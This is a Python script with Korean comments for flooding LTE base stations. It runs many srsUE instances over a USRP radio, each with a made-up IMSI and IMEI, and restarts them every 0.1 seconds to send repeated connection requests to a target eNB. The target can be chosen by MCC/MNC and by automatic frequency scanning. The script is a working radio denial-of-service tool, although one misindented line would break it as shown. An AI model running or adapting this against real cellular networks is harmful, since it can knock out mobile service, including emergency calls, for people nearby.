#!/usr/bin/env python3
"""
LTE Flooding Script
USRP 장치를 사용하여 srsRAN eNB에 연결 요청을 반복적으로 전송합니다.
"""

import subprocess
import threading
import time
import signal
import sys
import os
from typing import List, Optional
import argparse
import logging

# 로깅 설정
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class LTEFlooder:
    """LTE 연결 요청 flooding을 수행하는 클래스"""
    
    def __init__(self, usrp_args: str, num_instances: int = 10, 
                 interval: float = 0.1, srsue_config: str = "srsue.conf",
                 mcc: Optional[int] = None, mnc: Optional[int] = None,
                 earfcn: Optional[int] = None):
        """
        Args:
            usrp_args: USRP 장치 인자 (예: "serial=30AD123")
            num_instances: 동시에 실행할 srsUE 인스턴스 수
            interval: 각 연결 시도 사이의 간격 (초)
            srsue_config: srsUE 설정 파일 경로
            mcc: Mobile Country Code (예: 123)
            mnc: Mobile Network Code (예: 456)
            earfcn: 주파수 채널 번호 (예: 3400)
        """
        self.usrp_args = usrp_args
        self.num_instances = num_instances
        self.interval = interval
        self.srsue_config = srsue_config
        self.mcc = mcc
        self.mnc = mnc
        self.earfcn = earfcn
        self.processes: List[subprocess.Popen] = []
        self.running = False
        self.threads: List[threading.Thread] = []
        
    def create_ue_config(self, instance_id: int) -> str:
        """각 인스턴스별 고유한 설정 파일 생성"""
        # EARFCN 설정 (주파수)
        # 주파수를 지정하지 않고 MCC/MNC만 지정한 경우, 주파수 스캔을 비활성화
        # (srsUE가 자동으로 모든 주파수를 스캔하도록)
        if self.earfcn is not None:
            earfcn_value = self.earfcn
            earfcn_line = f"dl_earfcn = {earfcn_value}"
        elif (self.mcc is not None or self.mnc is not None):
            # MCC/MNC만 지정하고 주파수를 지정하지 않은 경우
            # 주파수 라인을 주석 처리하여 자동 스캔 활성화
            earfcn_line = "# dl_earfcn =  # 자동 스캔 (MCC/MNC 지정됨)"
            earfcn_value = "자동 스캔"
        else:
            # 둘 다 지정하지 않은 경우 기본값 사용
            earfcn_value = 3400
            earfcn_line = f"dl_earfcn = {earfcn_value}"
        
        # MCC/MNC 설정 (선택사항)
        mcc_mnc_section = ""
        target_info = []
        if self.mcc is not None:
            target_info.append(f"MCC={self.mcc}")
        if self.mnc is not None:
            target_info.append(f"MNC={self.mnc}")
        
        if target_info:
            if isinstance(earfcn_value, str):
                logger.info(f"{', '.join(target_info)}로 설정된 eNB를 찾습니다 (모든 주파수 자동 스캔)")
            else:
                logger.info(f"{', '.join(target_info)}로 설정된 eNB를 찾습니다 (주파수: EARFCN {earfcn_value})")
        
        # IMSI 포맷: MCC(3자리) + MNC(2-3자리) + MSIN(나머지)
        if self.mcc is not None and self.mnc is not None:
            # 둘 다 지정된 경우
            mnc_digits = 3 if self.mnc >= 100 else 2
            imsi = f"{self.mcc:03d}{self.mnc:0{mnc_digits}d}0000000{instance_id:03d}"
        elif self.mcc is not None:
            # MCC만 지정된 경우 (MNC는 기본값 01 사용)
            imsi = f"{self.mcc:03d}0100000000{instance_id:03d}"
        elif self.mnc is not None:
            # MNC만 지정된 경우 (MCC는 기본값 001 사용)
            mnc_digits = 3 if self.mnc >= 100 else 2
            imsi = f"001{self.mnc:0{mnc_digits}d}0000000{instance_id:03d}"
        else:
            # 둘 다 지정되지 않은 경우
            imsi = f"0010100000000{instance_id:03d}"
        
           config_content = f"""[rf]
device_name = uhd
device_args = {self.usrp_args}
tx_gain = 80
rx_gain = 40
nof_antennas = 1

[rat.eutra]
{earfcn_line}
{mcc_mnc_section}
nof_carriers = 1

[usim]
mode = soft
algo = milenage
opc  = 63bfa50ee6523365ff14c1f45f88737d
k    = 00112233445566778899aabbccddeeff
imsi = {imsi}
imei = 353490069873{instance_id:03d}
"""
        config_path = f"srsue_{instance_id}.conf"
        with open(config_path, 'w') as f:
            f.write(config_content)
        return config_path
    
    def run_srsue_instance(self, instance_id: int):
        """단일 srsUE 인스턴스 실행"""
        config_path = self.create_ue_config(instance_id)
        log_file = f"srsue_{instance_id}.log"
        
        while self.running:
            try:
                logger.info(f"UE 인스턴스 {instance_id} 시작 중...")
                cmd = [
                    "srsue",
                    config_path,
                    "--log.filename", log_file,
                    "--log.all_level", "info"
                ]
                
                # macOS와 Linux 호환성을 위한 프로세스 그룹 설정
                kwargs = {
                    'stdout': subprocess.PIPE,
                    'stderr': subprocess.PIPE,
                }
                # macOS에서는 setsid가 없으므로 조건부로 추가
                if hasattr(os, 'setsid'):
                    kwargs['preexec_fn'] = os.setsid
                elif sys.platform == 'darwin':
                    # macOS에서는 process group을 다르게 처리
                    kwargs['start_new_session'] = False
                
                process = subprocess.Popen(cmd, **kwargs)
                
                self.processes.append(process)
                
                # 프로세스가 종료될 때까지 대기
                process.wait()
                
                if self.running:
                    logger.info(f"UE 인스턴스 {instance_id} 재시작 중... (간격: {self.interval}초)")
                    time.sleep(self.interval)
                    
            except Exception as e:
                logger.error(f"UE 인스턴스 {instance_id} 오류: {e}")
                if self.running:
                    time.sleep(self.interval)
    
    def start(self):
        """Flooding 시작"""
        if self.running:
            logger.warning("이미 실행 중입니다.")
            return
        
        self.running = True
        target_info = []
        if self.earfcn is not None:
            target_info.append(f"주파수: EARFCN {self.earfcn}")
        if self.mcc is not None:
            target_info.append(f"MCC: {self.mcc}")
        if self.mnc is not None:
            target_info.append(f"MNC: {self.mnc}")
        if self.mcc is not None and self.mnc is not None:
            target_info.append(f"(핸드폰 표시: {self.mcc}{self.mnc:02d})")
        
        target_str = ", ".join(target_info) if target_info else "기본 설정"
        logger.info(f"LTE Flooding 시작: {self.num_instances}개 인스턴스, 간격: {self.interval}초, 대상: {target_str}")
        
        # 각 인스턴스에 대한 스레드 생성
        for i in range(self.num_instances):
            thread = threading.Thread(
                target=self.run_srsue_instance,
                args=(i,),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
            time.sleep(0.1)  # 인스턴스 시작 간격
        
        logger.info("모든 UE 인스턴스가 시작되었습니다.")
    
    def stop(self):
        """Flooding 중지"""
        if not self.running:
            return
        
        logger.info("LTE Flooding 중지 중...")
        self.running = False
        
        # 모든 프로세스 종료 (macOS와 Linux 호환)
        for process in self.processes:
            try:
                if sys.platform == 'darwin':
                    # macOS에서는 직접 terminate 사용
                    process.terminate()
                elif hasattr(os, 'killpg'):
                    # Linux에서는 프로세스 그룹으로 종료
                    try:
                        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                    except (OSError, ProcessLookupError):
                        process.terminate()
                else:
                    process.terminate()
                
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    # 타임아웃 시 강제 종료
                    if sys.platform == 'darwin':
                        process.kill()
                    elif hasattr(os, 'killpg'):
                        try:
                            os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                        except (OSError, ProcessLookupError):
                            process.kill()
                    else:
                        process.kill()
                    process.wait()
            except Exception as e:
                logger.error(f"프로세스 종료 오류: {e}")
                try:
                    process.kill()
                except:
                    pass
        
        self.processes.clear()
        
        # 임시 설정 파일 정리
        for i in range(self.num_instances):
            config_path = f"srsue_{i}.conf"
            if os.path.exists(config_path):
                try:
                    os.remove(config_path)
                except:
                    pass
        
        logger.info("LTE Flooding이 중지되었습니다.")


def main():
    parser = argparse.ArgumentParser(
        description="LTE Flooding - USRP를 사용하여 srsRAN eNB에 연결 요청을 반복 전송"
    )
    parser.add_argument(
        "--usrp-args",
        type=str,
        default="serial=30AD123",
        help="USRP 장치 인자 (예: serial=30AD123 또는 type=b200)"
    )
    parser.add_argument(
        "--instances",
        type=int,
        default=10,
        help="동시에 실행할 srsUE 인스턴스 수 (기본값: 10)"
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=0.1,
        help="각 연결 시도 사이의 간격(초) (기본값: 0.1)"
    )
    parser.add_argument(
        "--mcc",
        type=int,
        default=None,
        help="Mobile Country Code (예: 123). MCC만 지정하거나 MCC/MNC를 함께 지정할 수 있습니다."
    )
    parser.add_argument(
        "--mnc",
        type=int,
        default=None,
        help="Mobile Network Code (예: 456). MNC만 지정하거나 MCC/MNC를 함께 지정할 수 있습니다."
    )
    parser.add_argument(
        "--earfcn",
        type=int,
        default=None,
        help="주파수 채널 번호 (EARFCN). 특정 주파수를 지정합니다. (기본값: 3400)"
    )
    
    args = parser.parse_args()
    
    flooder = LTEFlooder(
        usrp_args=args.usrp_args,
        num_instances=args.instances,
        interval=args.interval,
        mcc=args.mcc,
        mnc=args.mnc,
        earfcn=args.earfcn
    )
    
    # 시그널 핸들러 설정
    def signal_handler(sig, frame):
        logger.info("\n종료 신호 수신...")
        flooder.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        flooder.start()
        
        # 메인 스레드 대기
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        logger.info("\n사용자에 의해 중지됨")
    finally:
        flooder.stop()


if __name__ == "__main__":
    main()

